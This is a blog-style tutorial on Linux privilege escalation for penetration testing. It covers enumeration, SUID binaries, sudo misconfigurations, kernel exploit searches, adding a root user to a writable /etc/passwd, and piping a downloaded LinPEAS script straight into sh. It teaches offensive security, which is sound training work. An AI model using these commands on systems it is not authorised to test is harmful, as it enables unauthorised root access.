---
title: "Linux Privilege Escalation Guide"
description: "Comprehensive guide to understanding and exploiting Linux privilege escalation vulnerabilities"
author: "Verve Team"
date: "2024-01-20"
readTime: "10 min read"
tags: ["Linux", "PrivEsc", "Security"]
featured: true
---

# Linux Privilege Escalation Guide

Privilege escalation is a critical skill in penetration testing. This guide covers essential techniques for escalating privileges on Linux systems.

## Understanding Privilege Escalation

Privilege escalation occurs when a user gains access to resources they normally wouldn't have access to, typically by exploiting a vulnerability or misconfiguration.

### Types of Privilege Escalation

- **Vertical** - Gaining higher privileges (user → root)
- **Horizontal** - Accessing another user's resources

## Enumeration

The first step is always enumeration. Gather as much information as possible:

```bash
# System information
uname -a
cat /etc/issue
cat /etc/*-release

# Current user info
id
whoami
groups

# Check sudo permissions
sudo -l

# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null
```

## Common Techniques

### 1. SUID Binaries

SUID binaries run with the permissions of their owner, not the user executing them.

```bash
# Find SUID files
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# Check GTFOBins for exploitation methods
```

### 2. Sudo Misconfigurations

```bash
# Check what you can run with sudo
sudo -l

# Look for entries without password requirement
# Look for wildcards or dangerous binaries
```

### 3. Kernel Exploits

```bash
# Find kernel version
uname -r

# Search for exploits
searchsploit linux kernel 4.15
```

### 4. Writable /etc/passwd

```bash
# Check if writable
ls -la /etc/passwd

# If writable, add a new root user
openssl passwd -1 -salt xyz password123
echo 'newroot:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
```

## Automated Tools

- **LinPEAS** - Linux Privilege Escalation Awesome Script
- **LinEnum** - Linux enumeration script
- **Linux Smart Enumeration (LSE)** - Another great enumeration tool

```bash
# Download and run LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## Best Practices

1. **Always enumerate thoroughly** - Don't rush
2. **Document everything** - Keep notes of what you find
3. **Understand the exploit** - Don't just run scripts
4. **Clean up after yourself** - Remove artifacts in real assessments

## Resources

- [GTFOBins](https://gtfobins.github.io/) - SUID exploitation techniques
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - Comprehensive resource
- [HackTricks](https://book.hacktricks.xyz/) - Pentesting wiki

---

*Practice these techniques in legal environments like TryHackMe and HackTheBox!*
